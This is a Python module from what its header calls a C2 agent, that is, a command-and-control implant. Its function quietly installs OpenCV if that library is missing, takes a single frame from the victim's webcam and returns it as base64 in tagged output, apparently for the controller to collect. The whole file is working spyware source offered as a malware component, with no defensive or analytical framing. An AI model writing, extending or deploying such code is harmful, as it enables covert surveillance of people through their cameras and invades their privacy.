"""C2 Agent - Webcam Capture"""
import subprocess, sys, textwrap
def capture_webcam():
    script = textwrap.dedent("""
    import subprocess as _sp, sys as _sy, os as _os
    try:
        import cv2 as _cv
    except ImportError:
        _sp.check_call([_sy.executable, "-m", "pip", "install", "opencv-python", "--quiet"])
        import cv2 as _cv
    _cam = _cv.VideoCapture(0, _cv.CAP_DSHOW)
    if not _cam.isOpened():
        _cam = _cv.VideoCapture(0)
    if not _cam.isOpened():
        print("[ERROR] No webcam found", flush=True)
        exit(1)
    _ok, _frame = _cam.read()
    _cam.release()
    if _ok:
        import base64 as _b
        _, _buf = _cv.imencode(".jpg", _frame, [int(_cv.IMWRITE_JPEG_QUALITY), 85])
        _b64 = _b.b64encode(_buf).decode()
        print("[IMG]" + _b64 + "[/IMG]", _frame.shape[0], "x", _frame.shape[1], flush=True)
    else:
        print("[ERROR] Failed to capture", flush=True)
    """)
    try:
        r = subprocess.run([sys.executable, "-c", script], capture_output=True, text=True, timeout=120)
        out = r.stdout + (r.stderr if r.stderr else "")
        return {"output": out.strip(), "exit_code": r.returncode}
    except Exception as e:
        return {"output": f"[ERROR] {e}", "exit_code": -1}
